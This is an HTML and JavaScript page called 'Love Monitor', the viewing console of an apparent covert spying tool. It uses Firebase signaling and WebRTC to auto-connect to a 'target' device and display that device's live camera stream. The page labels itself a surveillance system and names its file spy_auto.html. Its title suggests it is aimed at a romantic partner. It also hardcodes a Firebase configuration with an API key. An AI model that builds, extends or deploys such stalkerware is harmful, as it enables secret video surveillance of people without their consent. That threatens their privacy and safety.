<!DOCTYPE html>
<html>
<head>
    <title>🔍 Love Monitor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; }
        .title { color: #f0f; font-size: 2.5em; text-shadow: 0 0 10px #f0f; }
        #videoContainer {
            background: #000;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
            border: 3px solid #f0f;
            position: relative;
        }
        #remoteVideo {
            width: 100%;
            display: block;
        }
        .status-overlay {
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.8);
            color: #0f0;
            padding: 10px 15px;
            border-radius: 5px;
            font-size: 14px;
        }
        .control-panel {
            background: #111;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border: 1px solid #333;
        }
        .room-info {
            background: #222;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            border-left: 4px solid #f0f;
        }
        button {
            background: linear-gradient(45deg, #f0f, #0ff);
            color: black;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            margin: 10px 5px;
            font-size: 16px;
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .log {
            background: #111;
            padding: 15px;
            border-radius: 5px;
            height: 200px;
            overflow-y: auto;
            margin-top: 20px;
            border: 1px solid #333;
        }
        .log-entry {
            padding: 5px 0;
            border-bottom: 1px solid #222;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="title">💘 LOVE MONITOR</h1>
            <p>Real-time WebRTC Surveillance System</p>
        </div>
        
        <div id="videoContainer">
            <div class="status-overlay" id="statusOverlay">
                🔴 MENUNGGU KONEKSI
            </div>
            <video id="remoteVideo" autoplay playsinline></video>
        </div>
        
        <div class="control-panel">
            <div class="room-info" id="roomInfo">
                <strong>ROOM ID:</strong> <span id="roomIdDisplay">-</span>
                <br>
                <strong>STATUS:</strong> <span id="connectionStatus">Disconnected</span>
            </div>
            
            <button onclick="connectToRoom()" id="connectBtn">🔗 CONNECT TO ROOM</button>
            <button onclick="disconnect()" id="disconnectBtn" disabled>✖️ DISCONNECT</button>
            <button onclick="copyRoomLink()" id="copyBtn">📋 COPY ROOM LINK</button>
        </div>
        
        <div class="log" id="log"></div>
    </div>

    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <script>
        // ========== CONFIG ==========
        const firebaseConfig = {
            apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
            authDomain: "survei-f11a1.firebaseapp.com",
            databaseURL: "https://survei-f11a1-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "survei-f11a1",
            storageBucket: "survei-f11a1.firebasestorage.app",
            messagingSenderId: "769641850914",
            appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // ========== VARIABLES ==========
        let peerConnection;
        let roomId;
        let answerListener;
        let candidateListener;
        let statsInterval;
        
        // ========== GET ROOM ID FROM URL ==========
        function getRoomIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('room') || null;
        }
        
        // ========== ON LOAD ==========
        window.onload = function() {
            roomId = getRoomIdFromURL();
            
            if (roomId) {
                document.getElementById('roomIdDisplay').textContent = roomId;
                document.getElementById('statusOverlay').textContent = `🎯 ROOM DETECTED: ${roomId}`;
                log(`Auto-detected room: ${roomId}`);
                
                // Auto-connect after 1 second
                setTimeout(() => {
                    connectToRoom();
                }, 1000);
            } else {
                log("❌ No room ID in URL");
                log("Example URL: spy_auto.html?room=ABC123");
            }
        };
        
        // ========== CONNECT TO ROOM ==========
        async function connectToRoom() {
            if (!roomId) {
                log("❌ No room ID available!");
                return;
            }
            
            const connectBtn = document.getElementById('connectBtn');
            const disconnectBtn = document.getElementById('disconnectBtn');
            
            connectBtn.disabled = true;
            disconnectBtn.disabled = false;
            
            log(`🔗 Connecting to room: ${roomId}`);
            
            try {
                // Check if room exists
                const snapshot = await database.ref('rooms/' + roomId).once('value');
                if (!snapshot.exists()) {
                    throw new Error("Room tidak ditemukan di server!");
                }
                
                log("✅ Room found! Setting up WebRTC...");
                
                // Setup WebRTC
                await setupWebRTC();
                
                // Create and send offer
                const offer = await peerConnection.createOffer({
                    offerToReceiveVideo: true,
                    offerToReceiveAudio: false
                });
                
                await peerConnection.setLocalDescription(offer);
                
                // Clean old offer first
                await database.ref(`rooms/${roomId}/offer`).remove();
                
                // Send offer
                await database.ref(`rooms/${roomId}/offer`).set(offer);
                log("📤 Offer sent to target");
                
                // Setup listeners
                setupListeners();
                
                // Update UI
                document.getElementById('statusOverlay').textContent = "🟢 CONNECTING...";
                document.getElementById('connectionStatus').textContent = "Connecting";
                
            } catch (error) {
                log(`❌ Connection failed: ${error.message}`);
                connectBtn.disabled = false;
                document.getElementById('statusOverlay').textContent = "🔴 CONNECTION FAILED";
                
                // Auto-retry in 3 seconds
                setTimeout(() => {
                    if (!peerConnection || peerConnection.connectionState !== 'connected') {
                        log("🔄 Auto-retrying connection...");
                        connectToRoom();
                    }
                }, 3000);
            }
        }
        
        // ========== WEBRTC SETUP ==========
        function setupWebRTC() {
            peerConnection = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            });
            
            // Handle incoming stream
            peerConnection.ontrack = (event) => {
                log("🎥 Video stream received!");
                const video = document.getElementById('remoteVideo');
                video.srcObject = event.streams[0];
                
                document.getElementById('statusOverlay').textContent = "🔴 LIVE - CONNECTED";
                document.getElementById('connectionStatus').textContent = "Connected";
                log("✅ WebRTC connection established!");
            };
            
            // ICE candidate handler
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    database.ref(`rooms/${roomId}/spyCandidates`).push(event.candidate.toJSON());
                }
            };
            
            // Connection state
            peerConnection.onconnectionstatechange = () => {
                const state = peerConnection.connectionState;
                log(`Connection state: ${state}`);
                
                if (state === 'connected') {
                    document.getElementById('statusOverlay').textContent = "🔴 LIVE - STREAM ACTIVE";
                } else if (state === 'disconnected' || state === 'failed' || state === 'closed') {
                    handleDisconnection();
                }
            };
        }
        
        // ========== SETUP LISTENERS ==========
        function setupListeners() {
            // Listen for answer
            answerListener = database.ref(`rooms/${roomId}/answer`).on('value', async (snapshot) => {
                const answer = snapshot.val();
                if (answer && peerConnection.signalingState === 'have-local-offer') {
                    log("📥 Answer received from target");
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
                }
            });
            
            // Listen for target ICE candidates
            candidateListener = database.ref(`rooms/${roomId}/targetCandidates`).on('child_added', async (snapshot) => {
                const candidate = snapshot.val();
                if (candidate) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                        log("✅ ICE candidate added");
                    } catch (e) {
                        log(`⚠️ ICE error: ${e.message}`);
                    }
                }
            });
        }
        
        // ========== DISCONNECT ==========
        function disconnect() {
            cleanup();
            
            document.getElementById('connectBtn').disabled = false;
            document.getElementById('disconnectBtn').disabled = true;
            document.getElementById('statusOverlay').textContent = "🔴 DISCONNECTED";
            document.getElementById('connectionStatus').textContent = "Disconnected";
            
            log("✖️ Disconnected from room");
        }
        
        // ========== HANDLE DISCONNECTION ==========
        function handleDisconnection() {
            log("⚠️ Connection lost!");
            document.getElementById('statusOverlay').textContent = "🔴 RECONNECTING...";
            
            // Auto-reconnect
            setTimeout(() => {
                if (roomId && (!peerConnection || peerConnection.connectionState !== 'connected')) {
                    log("🔄 Auto-reconnecting...");
                    connectToRoom();
                }
            }, 2000);
        }
        
        // ========== COPY ROOM LINK ==========
        function copyRoomLink() {
            const link = `${window.location.origin}${window.location.pathname}?room=${roomId}`;
            navigator.clipboard.writeText(link).then(() => {
                log("📋 Room link copied to clipboard!");
            });
        }
        
        // ========== CLEANUP ==========
        function cleanup() {
            // Remove listeners
            if (answerListener) database.ref(`rooms/${roomId}/answer`).off('value', answerListener);
            if (candidateListener) database.ref(`rooms/${roomId}/targetCandidates`).off('child_added', candidateListener);
            
            // Clear intervals
            if (statsInterval) clearInterval(statsInterval);
            
            // Close WebRTC
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
            
            // Clear video
            const video = document.getElementById('remoteVideo');
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
        }
        
        // ========== LOG UTILITY ==========
        function log(message) {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = "log-entry";
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        // Auto-cleanup
        window.addEventListener('beforeunload', cleanup);
        window.addEventListener('pagehide', cleanup);
    </script>
</body>
    </html>
